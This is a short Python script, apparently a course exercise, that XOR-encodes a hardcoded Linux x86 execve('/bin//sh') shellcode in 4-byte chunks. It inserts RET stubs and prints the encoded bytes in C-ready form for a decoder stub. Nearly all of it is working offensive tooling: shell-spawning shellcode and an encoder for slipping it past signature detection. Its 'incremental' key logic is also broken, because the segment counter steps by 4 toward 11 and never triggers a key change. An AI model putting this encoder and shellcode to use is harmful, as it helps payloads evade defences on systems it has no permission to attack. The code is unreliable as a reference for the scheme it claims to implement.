#!/usr/bin/python
# Python Custom Incremental Encoder
# Author: SLAE-935

import random
from BitVector import * # https://engineering.purdue.edu/kak/dist/BitVector-3.4.7.html#8

shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
segment_size = 11

encoded = ""
encoded2 = ""
current_segment_encoded = ""
current_segment_encoded2 = ""

current_encrypt_key = 0xfbe7b6fd #0xfdb6e7fb #Little Endian (it should be the opposite of asm)
segment_jump_back_stub = 0xC3 # RET (pops latest 4bytes from the stack and put them in EIP returning to get_pc)

print 'Encoded shellcode ...'
shellcode_byte_ar = bytearray(shellcode)
lastIndex = 0
current_segment_size = 0 

shellcode_enc = BitVector(size = 0)

# Nop-Pad-Right the latest group if not a dword
for x in range(0, (4 - len(shellcode_byte_ar) % 4)):
    shellcode_byte_ar.append(0x90) 
  
# Progressive 4bytes xor encoder
for x in range(4, len(shellcode_byte_ar) + 4, 4):
    shellcode_chunk = BitVector(rawbytes = shellcode_byte_ar[lastIndex:x])
    key = BitVector(intVal=current_encrypt_key)
    print "Original chunk: " + shellcode_chunk.get_bitvector_in_hex()
    shellcode_enc_chunk = shellcode_chunk ^ key
    # xor current 4 bytes chunk
    shellcode_enc += shellcode_enc_chunk
    print "Encoded chunk: " + shellcode_enc_chunk.get_bitvector_in_hex()
    lastIndex = x
    current_segment_size += 4
    if (current_segment_size == segment_size):
        current_encrypt_key += 1
        current_segment_size = 0
# print(shellcode_enc.get_bitvector_in_hex())
# 31c050682f2f7368682f62696e89e35089e25389e1b00bcd80909090 Original
# ca27e695d4c8c59593c8d494956e55ad7205e5741a57bd307b77266d Encoded

# writes shellcode in c compatible format
current_segment_size = 0
for x in bytearray(shellcode_enc.get_bitvector_in_ascii()):
    current_segment_encoded += '\\x%02x' % x 
    current_segment_encoded2 += '0x%02x,' % x
    current_segment_size += 1
    # every 4 * segment_size bytes insert a callback stub
    if (current_segment_size == 4 * segment_size):
        current_segment_encoded += '\\x%02x' % segment_jump_back_stub
        current_segment_encoded2 += '0x%02x,' % segment_jump_back_stub
        current_segment_size = 0

print 'Original Shellcode: 31c050682f2f7368682f62696e89e35089e25389e1b00bcd80909090'
print 'Encoded Shellcode:  ' + shellcode_enc.get_bitvector_in_hex()
print 'Shellcode in compatible c format:'
print current_segment_encoded
print current_segment_encoded2

print 'Generating assembly for decoder'
print 'Len: %d' % len(bytearray(shellcode))
